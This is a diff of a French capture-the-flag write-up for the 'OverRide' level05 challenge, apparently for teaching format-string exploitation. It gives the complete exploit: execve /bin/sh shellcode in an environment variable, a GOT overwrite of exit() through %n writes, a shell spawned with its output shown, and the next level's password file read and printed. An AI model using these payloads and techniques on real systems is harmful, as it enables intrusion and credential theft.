@@ -1,3 +1,10 @@
+    __               ______  ______
+   / /__ _   _____  / / __ \/ ____/
+  / / _ \ | / / _ \/ / / / /___ \  
+ / /  __/ |/ /  __/ / /_/ /___/ /  
+/_/\___/|___/\___/_/\____/_____/   
+                                   
+
 Nous avons ici un binaire qui une fois lance nous affiche un prompt.
 Celui-ci nous convertit les majuscules en minuscule:
 
@@ -6,9 +13,74 @@ UPPER TO lower
 upper to lower
 
 un fgets de 100 char est effectue sur notre input, stocker puis afficher via
-printf, format string you know, localisons notre buffer:
+printf, qui est une source importantes d'exploitations type format strings.
 
-level05@OverRide:~$ python -c 'print "AAAA" + " %x" * 15' | ./level05
-aaaa 64 f7fcfac0 f7ec3af9 ffffd6af ffffd6ae 0 ffffffff ffffd734 f7fdb000 61616161 20782520 25207825 78252078 20782520 25207825
+Pour cette exploit nous allons réécrire la GOT de la fonction exit() avec l'adresse d'un SHELLCODE stocker dans une variable d'environnement.
 
-Il est a la 10eme place, 61 et non 41 car notre 'A' a ete lowercase.
+Afin de mener à bien cet exploit. Il nous faut :
+
+    1. Localiser l'adresse dans la GOT de la fonction exit()
+    2. Localiser notre SHELLCODE dans la stack
+    3. Localiser le buffer de printf() dans la memoire
+    4. Ecrire dans 0x80497e0 l'adresse GOT de la fonction exit() via %n 
+
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------
+  
+    1. Localiser l'adresse dans la GOT de la fonction exit()
+       
+       >$ objdump -R level05
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+    2. Localiser notre SHELLCODE dans la stack
+      
+       >$ export SHELLCODE=`python -c 'print "\x90" * 50 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"'`
+       >$ (gdb) x/s *((char **)(environ))
+           0xffffd85b:	 "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220
+           \220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220j\vX\231Rh//shh/bin\211\343\061\311\315\200"
+       Nous allons choisir une adresse au milieu de la nopsled : 0xffffd890
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+    3. Localiser le buffer de printf() dans la memoire
+       
+       >$ python -c 'print "AAAA" + " %x" * 15' | ./level05
+          aaaa 64 f7fcfac0 f7ec3af9 ffffd6af ffffd6ae 0 ffffffff ffffd734 f7fdb000 61616161 20782520 25207825 78252078 20782520 25207825
+       On retrouve notre buffer “61616161” en 10eme position, 
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+    4. Ecrire dans 0x80497e0 l'adresse GOT de la fonction exit()
+       
+       Nous allons utiliser le format specifier “%n“ qui saisis le nombre de caractères qui ont été écrits avec succès avant l’occurence de “%n” dans le flux ou 
+       la mémoire tampon. Cette valeur est stockée dans l'entier dont l'adresse est donnée en argument. 
+       
+       Il nous faut donc (0xffffd890) 4294957200 caractères avant “%n” afin de pouvoir réécrire	0x80497e0 avec l'adresse de notre SHELLCODE
+
+       Il n'est pas possible de donner directement 4294957200 caractères comme input en effet la limite du buffer de fgets nous en empeche 
+
+       Cela dit si nous rajoutons un entier X entre le "%" et "d" du bien connu format specifier "%d" on obtiendra un padding d'X espace " ". 
+       %Xd étant un format specifier l'input est interpreté au niveau de printf(). X étant un int, 4294957200 dépasse la limite d'un int il va donc
+       falloir écrire l'addresse en deux foix, les deux premiers bytes puis les deux suivant.
+       
+       (gdb) p 0xffffd890
+        $1 = 4294957200
+       (gdb) p 0xd890
+        $2 = 55440
+       (gdb) p 0xffff
+        $3 = 65535
+       
+       
+       Montons notre exploit :
+
+       >$ level05@OverRide:~$ (python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55432d" + "%10$n" + "%10095d" + "%11$n")'; cat) | ./level05 | tr -d " "
+          whoami
+          level06
+          cat /home/users/level06/.pass
+          h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
+
+
+
+Next …
